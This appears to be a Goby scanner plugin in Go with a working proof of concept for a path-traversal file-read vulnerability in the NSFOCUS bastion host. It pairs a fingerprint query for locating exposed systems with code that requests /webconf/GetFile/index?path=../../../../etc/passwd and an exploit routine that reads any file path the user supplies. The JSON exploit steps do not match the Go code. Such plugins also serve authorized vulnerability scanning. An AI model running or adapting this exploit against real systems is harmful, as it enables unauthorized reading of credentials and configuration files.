package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"strings"
)

func init() {
	expJson := `{
    "Name": "NSFOCUS Operation and Maintenance Security Management System GetFile/index api path parameter file read vulnerability",
    "Description": "<p>NSFOCUS Operation and Maintenance Security Management System (commonly known as Fortress Machine, also known as OSMS) is centered around meeting regulatory requirements such as \"identity authentication, access control, and security audit\" under hierarchical protection. Based on the 4A management concept of \"account, authentication, authorization, and audit\", it adopts the principles of separation of powers and minimum access rights to achieve precise pre identification, precise in-process control, and precise post audit.</p><p>Attackers can use this vulnerability to read important system files, such as database configuration files and system configuration files. This can make the site extremely unsafe.</p>",
    "Product": "NSFOCUS-Bastion-Host",
    "Homepage": "http://www.nsfocus.com.cn/",
    "DisclosureDate": "2017-09-21",
    "PostTime": "2023-08-09",
    "Author": "14m3ta7k",
    "FofaQuery": "title=\"NSFOCUS\" || (body=\"needUsbkey.php\" && body=\"/otp_auth.php\")",
    "GobyQuery": "title=\"NSFOCUS\" || (body=\"needUsbkey.php\" && body=\"/otp_auth.php\")",
    "Level": "2",
    "Impact": "<p>attackers can exploit to access crucial system files, such as database and system configuration files. This could result in a highly insecure state of the website.</p>",
    "Recommendation": "<p>The vendor has released a bug fix, please pay attention to the update in time:<a href=\"https://www.nsfocus.com.cn/html/2019/212_0926/20.html\">https://www.nsfocus.com.cn/html/2019/212_0926/20.html</a></p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "filePath",
            "type": "input",
            "value": "../../../../../../../../etc/passwd",
            "show": ""
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "File Read"
    ],
    "VulType": [
        "File Read"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "7.3",
    "Translation": {
        "CN": {
            "Name": "绿盟运维安全管理系统 GetFile/index 接口 path 参数文件读取漏洞",
            "Product": "NSFOCUS-堡垒机",
            "Description": "<p>绿盟运维安全管理系统（俗称堡垒机，英文简称OSMS）以满足等级保护下“身份鉴别、访问控制、安全审计”等监管要求为核心，基于“账号、认证、授权和审计”4A管理理念，采用三权分立和最小访问权限原则，实现精准的事前识别、精细的事中控制和精确的事后审计。</p><p>攻击者可以利用此漏洞读取系统重要文件，如数据库配置文件和系统配置文件等。这可能导致网站极度不安全。<br></p>",
            "Recommendation": "<p>厂商已发布了漏洞修复程序，请及时关注更新：<a href=\"https://www.nsfocus.com.cn/html/2019/212_0926/20.html\" target=\"_blank\">https://www.nsfocus.com.cn/html/2019/212_0926/20.html</a><br></p>",
            "Impact": "<p>攻击者可以利用此漏洞读取系统重要文件，如数据库配置文件和系统配置文件等。这可能导致网站极度不安全。<br></p>",
            "VulType": [
                "文件读取"
            ],
            "Tags": [
                "文件读取"
            ]
        },
        "EN": {
            "Name": "NSFOCUS Operation and Maintenance Security Management System GetFile/index api path parameter file read vulnerability",
            "Product": "NSFOCUS-Bastion-Host",
            "Description": "<p>NSFOCUS Operation and Maintenance Security Management System (commonly known as Fortress Machine, also known as OSMS) is centered around meeting regulatory requirements such as \"identity authentication, access control, and security audit\" under hierarchical protection. Based on the 4A management concept of \"account, authentication, authorization, and audit\", it adopts the principles of separation of powers and minimum access rights to achieve precise pre identification, precise in-process control, and precise post audit.</p><p>Attackers can use this vulnerability to read important system files, such as database configuration files and system configuration files. This can make the site extremely unsafe.</p>",
            "Recommendation": "<p>The vendor has released a bug fix, please pay attention to the update in time:<a href=\"https://www.nsfocus.com.cn/html/2019/212_0926/20.html\" target=\"_blank\">https://www.nsfocus.com.cn/html/2019/212_0926/20.html</a><br></p>",
            "Impact": "<p>attackers can exploit to access crucial system files, such as database and system configuration files. This could result in a highly insecure state of the website.<br></p>",
            "VulType": [
                "File Read"
            ],
            "Tags": [
                "File Read"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10817"
}`
	readFileJIODPUJW := func(hostInfo *httpclient.FixUrl, filePath string) (*httpclient.HttpResponse, error) {
		getConfig := httpclient.NewGetRequestConfig("/webconf/GetFile/index?path=" + filePath)
		getConfig.VerifyTls = false
		return httpclient.DoHttpRequest(hostInfo, getConfig)
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, hostInfo *httpclient.FixUrl, stepLogs *scanconfig.SingleScanConfig) bool {
			resp, err := readFileJIODPUJW(hostInfo, "../../../../../../../../etc/passwd")
			if err != nil {
				return false
			}
			return resp.StatusCode == 200 && strings.Contains(resp.Utf8Html, ":x:") && strings.Contains(resp.Utf8Html, ":0:") && strings.Contains(resp.Utf8Html, "/bin/")
		},
		func(expResult *jsonvul.ExploitResult, stepLogs *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			filePath := stepLogs.Params["filePath"].(string)
			resp, err := readFileJIODPUJW(expResult.HostInfo, filePath)
			if err != nil {
				expResult.Success = false
				expResult.Output = err.Error()
				return expResult
			}
			if (resp.StatusCode == 200 || (resp.StatusCode == 404 && strings.Contains(resp.Utf8Html, filePath+` not found`))) && len(resp.Utf8Html) > 0 {
				expResult.Success = true
				expResult.Output = strings.ReplaceAll(resp.Utf8Html, `<h1>HTTP/1.0 404 Not Found</h1>`, ``)
			}
			return expResult
		},
	))
}
